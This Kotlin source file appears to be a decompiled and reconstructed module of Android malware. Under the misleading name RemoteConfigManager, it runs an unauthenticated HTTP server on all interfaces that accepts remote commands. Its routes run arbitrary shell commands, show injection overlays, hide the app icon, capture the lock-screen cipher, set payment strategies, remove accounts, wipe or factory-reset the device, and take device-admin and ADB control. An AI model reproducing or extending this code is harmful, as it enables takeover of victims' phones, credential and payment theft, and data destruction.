package com.storm.safe.rock.service.modules

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.storm.safe.rock.AppVariantA
import com.storm.safe.rock.AppVariantB
import com.storm.safe.rock.AppVariantC
import com.storm.safe.rock.AppVariantD
import com.storm.safe.rock.AppVariantE
import com.storm.safe.rock.AppVariantF
import com.storm.safe.rock.AppVariantG
import com.storm.safe.rock.AppVariantH
import com.storm.safe.rock.AppVariantI
import com.storm.safe.rock.AppVariantJ
import com.storm.safe.rock.AppVariantK
import com.storm.safe.rock.AppVariantL
import com.storm.safe.rock.AppVariantN
import com.storm.safe.rock.DefaultLauncherAlias
import com.storm.safe.rock.inject.jbqfkndyx
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.command.CommandDispatcher
import com.storm.safe.rock.service.modules.routes.AccountRouteHandlers
import com.storm.safe.rock.service.modules.routes.AdbStatusRouteHandler
import com.storm.safe.rock.service.modules.routes.AppRouteHandlers
import com.storm.safe.rock.service.modules.routes.DeviceAdminRouteHandlers
import com.storm.safe.rock.service.modules.routes.IconRouteHandlers
import com.storm.safe.rock.service.modules.routes.StatusRouteHandlers
import com.storm.safe.rock.service.modules.setup.SystemOptimizeManager
import com.storm.safe.rock.util.StringUtil
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.io.PrintWriter
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.ServerSocket
import java.net.Socket
import java.net.URLDecoder
import java.util.LinkedHashMap
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Remote configuration manager — local HTTP server facade.
 * Routes requests to handler objects in the routes/ package.
 *
 * Reverse-engineered from JADX: C0322a7 (a7, 2393 lines).
 * Route handler logic extracted to:
 * - StatusRouteHandlers      (accessibility, lock, net, screen, version, alive, deviceAdmin)
 * - DeviceAdminRouteHandlers (admin activation, uninstall, wipe, ADB/WiFi/dev toggles, write settings)
 * - AppRouteHandlers         (command exec, global actions, injection, browser, payment, blockView, cipher)
 * - IconRouteHandlers        (visibility, showIcon, iconStatus, mainPackageName)
 * - AccountRouteHandlers     (account protection, accessibility pause/resume)
 *
 * JADX name: LocalHttpServer (combined)
 *
 * Fields:
 * - f53088a0 (dqtvuisjd) -> [context] (service context)
 * - f53089a1 (ServerSocket) -> [serverSocket]
 * - f53090a2 (ExecutorService) -> [executor]
 * - f53091a3 (AtomicBoolean) -> [isRunningFlag]
 * - f53092a4 (Thread) -> [serverThread]
 * - f53093a5 (C0350a7) -> [commandDispatcher]
 * - f53094a6 (LinkedHashMap) -> [customRoutes]
 * - f53095a7 (Handler) -> [mainHandler]
 * - f53096a8 (volatile int) -> [retryCount]
 *
 * Static:
 * - f53085a9 (ac0) -> [companion lock]
 * - f53086b0 (volatile int) -> [DEFAULT_PORT]
 * - f53087b1 (volatile C0322a7) -> [instance]
 */
class RemoteConfigManager(
    private val context: Context
) {
    companion object {
        private const val TAG = "LocalHttpServer"
        const val DEFAULT_PORT = 7910
        private const val LOCAL_SERVICE_PORT = 7912
        private const val MAX_RETRY_COUNT = 30
        private const val RETRY_DELAY_MS = 10000L

        @Volatile
        var instance: RemoteConfigManager? = null

        /** JADX: f53086b0 -- current port (volatile) */
        @Volatile
        var currentPort: Int = DEFAULT_PORT

        // --- Static response builders (JADX: a1, e8, a7, c1) ---

        /**
         * Build an error JSON response.
         * JADX: m211585a1 (a1)
         */
        @JvmStatic
        fun makeErrorResponse(message: String): JSONObject {
            val json = JSONObject()
            json.put("code", 500)
            json.put("success", false)
            json.put("msg", message)
            return json
        }

        /**
         * Build a text/success JSON response.
         * JADX: m211596e8 (e8)
         */
        @JvmStatic
        fun makeTextResponse(text: String): JSONObject {
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            json.put("msg", text)
            return json
        }

        /**
         * Build a JSON container state response.
         * JADX: m211586a7 (a7) -- /containerState
         */
        @JvmStatic
        fun containerState(): JSONObject {
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            val data = JSONObject()
            data.put("accessibilityRunning", true)
            data.put("localHttpServerPort", currentPort)
            data.put("localServicePort", LOCAL_SERVICE_PORT)
            json.put("data", data)
            return json
        }

        /**
         * Parse injection tasks from service.
         * JADX: m211590c1 (c1) -- /injectionTasks
         */
        @JvmStatic
        fun injectionTasks(): JSONObject {
            return try {
                val service = MyAccessibilityService.getInstance()
                    ?: return makeErrorResponse("dqtvuisjd 未运行")
                val tasks: Map<String, String>
                synchronized(service.injectionTasksLock) {
                    tasks = HashMap(service.injectionTasks)
                }
                val packagesArray = JSONArray()
                for (key in tasks.keys) {
                    packagesArray.put(key)
                }
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", true)
                json.put("count", tasks.size)
                json.put("packages", packagesArray)
                json
            } catch (e: Exception) {
                Log.e(TAG, "获取注入任务列表失败", e)
                makeErrorResponse("获取注入任务列表失败: ${e.message}")
            }
        }

        /**
         * ADB shell command execution.
         * JADX: m211588b5 (b5) -- /adbShell, /shell, /debug
         */
        @JvmStatic
        fun adbShell(params: Map<String, String>): JSONObject {
            return try {
                var cmd = params["cmd"]
                if (cmd == null) {
                    cmd = params[StringUtil.decrypt("KFYcN0w2CA==")]
                }
                if (cmd == null) {
                    return makeErrorResponse("缺少 cmd 参数")
                }
                Log.d(TAG, "★ [adbShell] 执行: $cmd")
                // JADX: C0360a2.f53810f9.getInstance() -> singleton null check -> m212058e8(str)
                val service = MyAccessibilityService.instance
                val j41Var = if (service != null) {
                    SystemOptimizeManager.getInstance(service, service.applicationContext)
                } else null
                if (j41Var == null) {
                    return makeErrorResponse("SystemOptimizeManager 未初始化，ADB 连接不可用")
                }
                val output: String? = j41Var.executeShellCommand(cmd)
                val truncated = if (output != null && output.length > 200) {
                    output.substring(0, 200)
                } else {
                    output ?: "null"
                }
                Log.d(TAG, "★ [adbShell] 输出: $truncated")
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", output != null)
                val data = JSONObject()
                data.put("output", output ?: "")
                data.put(StringUtil.decrypt("KFYcN0w2CA=="), cmd)
                json.put("data", data)
                json
            } catch (e: Exception) {
                Log.e(TAG, "adbShell 执行异常", e)
                makeErrorResponse("adbShell 异常: ${e.message}")
            }
        }

        /**
         * Close injection activity.
         * JADX: m211589b8 (b8) -- /closeInjection
         */
        @JvmStatic
        fun closeInjection(): JSONObject {
            return try {
                // JADX: jbqfkndyx.f51944a4.finishCurrent()
                jbqfkndyx.finishCurrent()
                Log.d(TAG, "✅ [注入] 已发送关闭注入Activity指令")
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", true)
                json
            } catch (e: Exception) {
                Log.e(TAG, "关闭注入Activity失败", e)
                makeErrorResponse("关闭注入Activity失败: ${e.message}")
            }
        }

        /**
         * Send shutdown request to old port.
         * JADX: m211593e3 (e3)
         */
        @JvmStatic
        fun sendShutdown(address: InetAddress, port: Int) {
            try {
                val socket = Socket()
                socket.connect(InetSocketAddress(address, port), 1000)
                val writer = PrintWriter(socket.getOutputStream(), true)
                writer.print("GET /shutdown HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
                writer.flush()
                Thread.sleep(200L)
                socket.close()
                Log.i(TAG, "已向旧端口 $port 发送关闭请求")
            } catch (_: Exception) {
                // Intentionally silenced -- old server may not be running
            }
        }

        /**
         * Parse query string into key-value map.
         * JADX: m211594e4 (e4)
         */
        @JvmStatic
        fun parseQueryString(queryString: String): LinkedHashMap<String, String> {
            val result = LinkedHashMap<String, String>()
            if (queryString.isEmpty()) return result
            val pairs = queryString.split("&")
            for (pair in pairs) {
                val kv = pair.split("=", limit = 2)
                if (kv.size == 2) {
                    val key = URLDecoder.decode(kv[0], "UTF-8")
                    val value = URLDecoder.decode(kv[1], "UTF-8")
                    result[key] = value
                }
            }
            return result
        }

        /**
         * Write HTTP response to socket.
         * JADX: m211595e6 (e6)
         */
        @JvmStatic
        fun writeHttpResponse(writer: PrintWriter, statusCode: Int, body: JSONObject) {
            val bodyStr = body.toString()
            val bodyBytes = bodyStr.toByteArray(Charsets.UTF_8)
            writer.print("HTTP/1.1 $statusCode OK\r\n")
            writer.print("Content-Type: application/json; charset=utf-8\r\n")
            writer.print("Content-Length: ${bodyBytes.size}\r\n")
            writer.print("Connection: close\r\n")
            writer.print("\r\n")
            writer.print(bodyStr)
            writer.flush()
        }

        /**
         * Get list of launcher alias classes.
         * JADX: m211587a9 (a9)
         */
        @JvmStatic
        fun getLauncherAliases(): List<Class<*>> {
            return listOf(
                DefaultLauncherAlias::class.java,
                AppVariantA::class.java,
                AppVariantB::class.java,
                AppVariantC::class.java,
                AppVariantD::class.java,
                AppVariantE::class.java,
                AppVariantF::class.java,
                AppVariantG::class.java,
                AppVariantH::class.java,
                AppVariantI::class.java,
                AppVariantJ::class.java,
                AppVariantK::class.java,
                AppVariantL::class.java,
                AppVariantN::class.java,
            )
        }
    }

    // --- Instance fields (JADX: f53088a0..f53096a8) ---

    private val isRunningFlag = AtomicBoolean(false)
    private var serverSocket: ServerSocket? = null
    private var executor: ExecutorService? = null
    private var serverThread: Thread? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    /** Custom route handlers registered by other modules. JADX: f53094a6 */
    private val customRoutes: LinkedHashMap<String, RouteHandler> = LinkedHashMap()

    /** Command dispatcher reference. JADX: f53093a5 */
    var commandDispatcher: CommandDispatcher? = null

    /** Retry count for port binding. JADX: f53096a8 */
    @Volatile
    private var retryCount: Int = 0

    /** Route handler interface (suspend-like via callback). */
    fun interface RouteHandler {
        fun handle(params: Map<String, String>, body: String?): JSONObject
    }

    // ---------------------------------------------------------------
    // Lifecycle -- JADX: m211632e7 (e7), start/stop
    // ---------------------------------------------------------------

    fun isRunning(): Boolean = isRunningFlag.get()

    /**
     * Register a custom route handler.
     */
    fun registerRoute(path: String, handler: RouteHandler) {
        customRoutes[path] = handler
    }

    /**
     * Start the HTTP server.
     * JADX: m211632e7 (e7) -- stops old instance, CAS on isRunning, starts daemon thread
     */
    fun start(port: Int = DEFAULT_PORT) {
        val old = instance
        if (old != null && old !== this) {
            Log.d(TAG, "检测到旧实例，先停止旧服务器")
            old.stop()
            try { Thread.sleep(500L) } catch (_: InterruptedException) {}
        }
        instance = this
        if (!isRunningFlag.compareAndSet(false, true)) {
            Log.w(TAG, "⚠️ 服务器已在运行")
            return
        }

        executor = Executors.newFixedThreadPool(8)

        val thread = Thread({
            var bound = false
            for (tryPort in port..(port + 8)) {
                if (tryPort == LOCAL_SERVICE_PORT) {
                    Log.w(TAG, "⚠️ 跳过端口 $tryPort（local-service 保留端口）")
                    continue
                }
                try {
                    val ss = ServerSocket()
                    ss.reuseAddress = true
                    ss.bind(java.net.InetSocketAddress("0.0.0.0", tryPort), 50)
                    serverSocket = ss
                    currentPort = tryPort
                    bound = true
                    Log.i(TAG, "✅ 本地HTTP服务器已启动: 0.0.0.0:$tryPort")

                    if (tryPort != DEFAULT_PORT) {
                        try {
                            val url = java.net.URL("http://127.0.0.1:$LOCAL_SERVICE_PORT/setAppPort?port=$tryPort")
                            val conn = url.openConnection() as java.net.HttpURLConnection
                            conn.connectTimeout = 2000
                            conn.readTimeout = 2000
                            conn.requestMethod = "GET"
                            conn.responseCode
                            conn.disconnect()
                            Log.i(TAG, "📡 已通知 local-service 实际端口: $tryPort")
                        } catch (e: Exception) {
                            Log.w(TAG, "⚠️ 通知 local-service 端口失败: ${e.message}")
                        }
                    }

                    while (isRunningFlag.get()) {
                        val client = try {
                            ss.accept()
                        } catch (e: Exception) {
                            if (isRunningFlag.get()) Log.w(TAG, "accept 异常: ${e.message}")
                            break
                        }
                        executor?.submit {
                            try {
                                client.soTimeout = 10_000
                                handleClient(client)
                            } catch (e: Exception) {
                                Log.w(TAG, "处理客户端异常: ${e.message}")
                            } finally {
                                try { client.close() } catch (_: Exception) {}
                            }
                        }
                    }
                    break
                } catch (e: java.net.BindException) {
                    Log.w(TAG, "⚠️ 端口 $tryPort 被占用: ${e.message}")
                } catch (e: Exception) {
                    Log.e(TAG, "端口 $tryPort 绑定失败: ${e.message}")
                }
            }
            if (!bound) {
                Log.e(TAG, "❌ 所有端口 (${port}..${port + 8}) 绑定失败")
                isRunningFlag.set(false)
            }
        }, "LocalHttpServer")
        serverThread = thread
        thread.isDaemon = true
        thread.start()
        Log.i(TAG, "RemoteConfigManager starting on port $port")
    }

    private fun handleClient(client: java.net.Socket) {
        val input = client.getInputStream().bufferedReader(Charsets.UTF_8)
        val output = client.getOutputStream()

        val requestLine = input.readLine() ?: return
        val parts = requestLine.split(" ")
        if (parts.size < 2) return

        val fullPath = parts[1]
        val pathAndQuery = fullPath.split("?", limit = 2)
        val path = pathAndQuery[0]
        val queryParams = mutableMapOf<String, String>()
        if (pathAndQuery.size > 1) {
            for (param in pathAndQuery[1].split("&")) {
                val kv = param.split("=", limit = 2)
                if (kv.size == 2) queryParams[kv[0]] = java.net.URLDecoder.decode(kv[1], "UTF-8")
            }
        }

        var contentLength = 0
        while (true) {
            val headerLine = input.readLine() ?: break
            if (headerLine.isEmpty()) break
            if (headerLine.lowercase().startsWith("content-length:")) {
                contentLength = headerLine.substringAfter(":").trim().toIntOrNull() ?: 0
            }
        }

        var body: String? = null
        if (contentLength > 0) {
            val buf = CharArray(contentLength)
            var read = 0
            while (read < contentLength) {
                val n = input.read(buf, read, contentLength - read)
                if (n <= 0) break
                read += n
            }
            body = String(buf, 0, read)
        }

        val mergedParams = HashMap(queryParams)
        if (body != null) {
            try {
                val jsonBody = JSONObject(body)
                for (key in jsonBody.keys()) {
                    mergedParams[key as String] = jsonBody.optString(key, "")
                }
            } catch (_: Exception) {
                mergedParams["body"] = body
            }
        }

        val response = try {
            routeRequest(path, mergedParams, body)
        } catch (e: Exception) {
            Log.e(TAG, "路由异常: $path", e)
            makeErrorResponse("服务器内部错误: ${e.message}")
        }

        val responseBytes = response.toString().toByteArray(Charsets.UTF_8)
        val httpResponse = "HTTP/1.1 200 OK\r\n" +
            "Content-Type: application/json; charset=utf-8\r\n" +
            "Content-Length: ${responseBytes.size}\r\n" +
            "Connection: close\r\n" +
            "\r\n"
        output.write(httpResponse.toByteArray(Charsets.UTF_8))
        output.write(responseBytes)
        output.flush()
    }

    /**
     * Stop the HTTP server.
     */
    fun stop() {
        isRunningFlag.set(false)
        try {
            serverSocket?.close()
        } catch (_: IOException) {
        }
        serverSocket = null
        executor?.shutdownNow()
        executor = null
        serverThread?.interrupt()
        serverThread = null
        Log.i(TAG, "RemoteConfigManager stopped")
    }

    /**
     * Retry port binding with delay.
     * JADX: m211631e5 (e5)
     */
    fun retryBind() {
        if (retryCount >= MAX_RETRY_COUNT) {
            Log.e(TAG, "端口绑定已重试 $MAX_RETRY_COUNT 次仍失败，放弃")
            return
        }
        retryCount++
        mainHandler.postDelayed({ start() }, RETRY_DELAY_MS)
    }

    // ---------------------------------------------------------------
    // Route dispatcher -- JADX: m211584a0 (a0)
    // Pure dispatch: each route is a one-line delegation to a handler object.
    // ---------------------------------------------------------------

    /**
     * Route a request to the appropriate handler.
     * JADX: m211584a0 (a0) -- the main route switch with ~50 cases
     */
    fun routeRequest(path: String, params: Map<String, String>, body: String?): JSONObject {
        return try {
            when (path) {
                // --- Index ---
                "/", "/index" ->
                    makeTextResponse("LocalHttpServer running on port $currentPort")

                // --- State queries (StatusRouteHandlers) ---
                "/containerState" -> containerState()
                "/injectionTasks" -> injectionTasks()
                "/accessibilityState" -> StatusRouteHandlers.accessibilityState(context)
                "/lockState" -> StatusRouteHandlers.lockState(context)
                "/netState" -> StatusRouteHandlers.netState(context)
                "/screenState" -> StatusRouteHandlers.screenState(context)
                "/deviceId" -> StatusRouteHandlers.deviceId(context)
                "/version" -> makeTextResponse(StatusRouteHandlers.version(context))
                "/noticeAlive" -> StatusRouteHandlers.noticeAlive(context)
                "/deviceAdmin" -> StatusRouteHandlers.deviceAdmin(context)

                // --- ADB status (AdbStatusRouteHandler) ---
                // ADAPT: Panel 需要的聚合端点，vendor 无此路由
                "/adbStatus" -> AdbStatusRouteHandler.handle(context)

                // --- Permissions (PermissionCollector) ---
                // ADAPT: Panel 需要的权限查询端点，vendor 无此路由
                "/permissions" -> StatusRouteHandlers.permissions(context)

                // --- Icon management (IconRouteHandlers) ---
                "/visibility", "/hideIcon" -> IconRouteHandlers.visibility(context)
                "/showIcon" -> IconRouteHandlers.showIcon(context)
                "/iconStatus" -> IconRouteHandlers.iconStatus(context)

                // --- Package name (IconRouteHandlers) ---
                "/mainPackageName" -> IconRouteHandlers.mainPackageName(context, params)

                // --- Command execution (AppRouteHandlers) ---
                "/command" -> AppRouteHandlers.executeCommand(params, body, commandDispatcher)
                "/exec" -> AppRouteHandlers.executeCommand(params, body, commandDispatcher)

                // --- Direct dispatch (AppRouteHandlers) ---
                "/dispatch" -> AppRouteHandlers.dispatchCommand(body, commandDispatcher)

                // --- Global actions (AppRouteHandlers) ---
                "/global/action" -> AppRouteHandlers.executeGlobalAction(params, body, commandDispatcher)
                "/global/lockScreen" -> AppRouteHandlers.executeLockScreen(commandDispatcher)
                "/global/wakeUpScreen" -> AppRouteHandlers.executeWakeScreen(commandDispatcher)

                // --- ADB / shell / debug (aliases) ---
                "/adbShell", "/shell", "/debug" -> adbShell(params)

                // --- Lock cipher (AppRouteHandlers) ---
                "/syncLockCipher" -> AppRouteHandlers.syncLockCipher(context, body, params)

                // --- Injection (AppRouteHandlers + companion) ---
                "/showInjection" -> AppRouteHandlers.showInjection(context, body, params)
                "/closeInjection" -> closeInjection()

                // --- Accessibility pause/resume (AccountRouteHandlers) ---
                "/pauseAccessibility" -> AccountRouteHandlers.pauseAccessibility(params)
                "/resumeAccessibility" -> AccountRouteHandlers.resumeAccessibility(params)

                // --- Account protection (AccountRouteHandlers) ---
                "/enableAccountProtection" -> AccountRouteHandlers.enableAccountProtection(context)
                "/disableAccountProtection" -> AccountRouteHandlers.disableAccountProtection(context)
                "/removeAllAccounts" -> AccountRouteHandlers.removeAllAccounts(context)

                // --- Device admin (DeviceAdminRouteHandlers) ---
                "/startAdminActive" -> DeviceAdminRouteHandlers.startAdminActive(context)
                "/stopAdminActive" -> DeviceAdminRouteHandlers.stopAdminActive(context)
                "/activeDeviceOwner" -> DeviceAdminRouteHandlers.activeDeviceOwner(context)
                "/uninstallPolicy" -> DeviceAdminRouteHandlers.uninstallPolicy(context, params, commandDispatcher)

                // --- ADB/WiFi/Development toggles (DeviceAdminRouteHandlers) ---
                "/activeADBDebug" -> DeviceAdminRouteHandlers.toggleAdb(context, true)
                "/closeADBDebug" -> DeviceAdminRouteHandlers.toggleAdb(context, false)
                "/activeWifiDebug" -> DeviceAdminRouteHandlers.toggleWifi(context, true)
                "/closeWifiDebug" -> DeviceAdminRouteHandlers.toggleWifi(context, false)
                "/activeDevelopment" -> DeviceAdminRouteHandlers.activeDevelopment(context, true)
                "/closeDevelopment" -> DeviceAdminRouteHandlers.activeDevelopment(context, false)

                // --- Write settings (DeviceAdminRouteHandlers) ---
                "/openWriteSecure" -> DeviceAdminRouteHandlers.openWriteSecure(context)
                "/writeAccessibility" -> DeviceAdminRouteHandlers.writeAccessibility(context, params)

                // --- Wipe / factory reset (DeviceAdminRouteHandlers) ---
                "/wipeData", "/factoryReset", "/reset", "/restore" ->
                    DeviceAdminRouteHandlers.wipeData(context, params)

                // --- Browser apps (AppRouteHandlers) ---
                "/browserApps" -> AppRouteHandlers.browserApps(context)

                // --- Payment strategies (AppRouteHandlers) ---
                "/setPaymentStrategies" -> AppRouteHandlers.setPaymentStrategies(context, body)

                // --- Block overlay (AppRouteHandlers) ---
                "/blockView" -> AppRouteHandlers.handleBlockView(params, commandDispatcher)

                // --- Screenshot shortcut (AppRouteHandlers) ---
                "/screenshot/0" -> AppRouteHandlers.screenshotCommand(commandDispatcher)

                // --- Special commands with merged params (AppRouteHandlers) ---
                "/startApp" -> AppRouteHandlers.startAppCommand(params, body, commandDispatcher)
                "/killApp" -> AppRouteHandlers.killAppCommand(params, body, commandDispatcher)
                "/unlock" -> AppRouteHandlers.unlockCommand(params, body, commandDispatcher)

                // --- Debug: WebSocket connection trigger ---
                "/connectWebSocket" -> AppRouteHandlers.connectWebSocket(context, params)

                // --- Custom routes fallback ---
                else -> {
                    val custom = customRoutes[path]
                    if (custom != null) {
                        custom.handle(params, body)
                    } else {
                        makeErrorResponse("未知路由: $path")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "路由处理异常: $path", e)
            makeErrorResponse("处理异常: ${e.message}")
        }
    }
}
